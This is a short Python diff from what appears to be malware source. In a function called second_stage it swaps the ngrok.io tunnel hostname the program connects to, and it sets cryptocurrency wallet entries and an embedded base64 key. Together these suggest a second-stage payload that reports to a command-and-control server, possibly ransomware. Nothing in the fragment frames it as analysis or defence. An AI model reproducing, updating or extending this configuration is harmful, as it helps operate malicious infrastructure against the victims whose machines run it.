@@ -71,7 +71,7 @@ def second_stage():
             conf = shelve.open('conf')
         return conf
     get_conf()
-    conf['Connected'] = ['3300945b1410.ngrok.io']
+    conf['Connected'] = ['457af3235c91.ngrok.io']
     conf['Version'] = '1.000'
     conf['OurWallets'] = ['BTC','SKR']
     conf['Key'] = 'AAAAgQCkuqxx8XsVCOn0+Z3EFogneSuTOXRFsbRIACp8mLiXsv2v44Aa/uCFFpSPvleT/hIkJob+88StiMRQRtmHkbqeN1POfpNO1rPxJT1JONhHISns301hGN5k8ixQIdUiLduP0c7eewwfd1gyMScL+9YlBopQEb18BpzF0tjP+lWOdQ=='
